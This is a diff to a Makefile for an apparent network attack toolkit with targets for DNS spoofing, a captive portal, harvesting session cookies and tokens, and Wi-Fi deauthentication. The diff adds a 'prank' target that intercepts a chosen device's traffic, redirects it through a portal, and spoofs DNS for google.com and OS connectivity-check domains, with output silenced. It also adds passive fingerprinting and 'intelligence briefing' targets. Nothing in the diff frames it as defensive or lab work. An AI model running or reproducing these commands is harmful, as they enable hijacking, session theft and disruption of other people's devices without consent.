@@ -42,10 +42,37 @@ spoof: ## Start DNS Spoofer after intercept (usage: make spoof IP=192.168.1.5 RU
 	@sudo PYTHONPATH=. $(PYTHON) -m radar.fingerprint.dns_spoofer $(IP) $(RULES)
 
 portal: ## Start captive portal web server (usage: make portal  or  make portal PORT=80)
-	@sudo PYTHONPATH=. $(PYTHON) -m radar.fingerprint.portal $(if $(PORT),--port $(PORT),)
+	@sudo PYTHONPATH=. $(PYTHON) -m radar.fingerprint.portal $(if $(PORT),--port $(PORT),) $(if $(REDIRECT),--redirect $(REDIRECT),)
 
 hijack: ## Harvest session cookies and tokens (usage: make hijack IP=192.168.1.5)
 	@sudo PYTHONPATH=. $(PYTHON) -m radar.fingerprint.hijacker $(IP)
+
+prank: ## Automated Redirect Prank (usage: make prank IP=192.168.1.5 URL=https://...)
+	@echo "🛡️  Validating permissions... (Please enter your password if prompted)"
+	@sudo -v
+	@echo "🎯 Launching Tactical Prank on $(IP)..."
+	@sudo -n PYTHONPATH=. $(PYTHON) -m radar.fingerprint.tactical $(IP) > /dev/null 2>&1 & \
+	 sleep 2; \
+	 sudo -n PYTHONPATH=. $(PYTHON) -m radar.fingerprint.portal --port 80 --redirect "$(URL)" > /dev/null 2>&1 & \
+	 sleep 2; \
+	 sudo -n PYTHONPATH=. $(PYTHON) -m radar.fingerprint.dns_spoofer $(IP) \
+	   google.com=192.168.10.132 \
+	   connectivitycheck.gstatic.com=192.168.10.132 \
+	   captive.apple.com=192.168.10.132 \
+	   neverssl.com=192.168.10.132; \
+	 sudo pkill -f radar.fingerprint.tactical; \
+	 sudo pkill -f radar.fingerprint.portal
+
+intel: ## Start Passive Intelligence Collector (Silent Fingerprinting)
+	@echo "🕵️  Starting Passive Intelligence Collector..."
+	@sudo -n PYTHONPATH=. $(PYTHON) -m radar.fingerprint.passive
+
+report: ## Generate PDF Intelligence Briefing
+	@echo "📄 Generating Intelligence Briefing..."
+	@PYTHONPATH=. $(PYTHON) -m radar.reports.intelligence_brief
+
+flows: ## Show detailed traffic logs for a device (usage: make flows IP=192.168.1.5)
+	@PYTHONPATH=. $(PYTHON) -m radar.reports.flow_viewer $(IP)
 
 kick: ## Kick a device off Wi-Fi — requires monitor mode (usage: make kick MAC=AA:BB:CC TARGET=XX:YY:ZZ IFACE=wlan0mon)
 	@sudo PYTHONPATH=. $(PYTHON) -m radar.fingerprint.deauth $(MAC) $(TARGET) $(if $(IFACE),$(IFACE),wlan0mon)
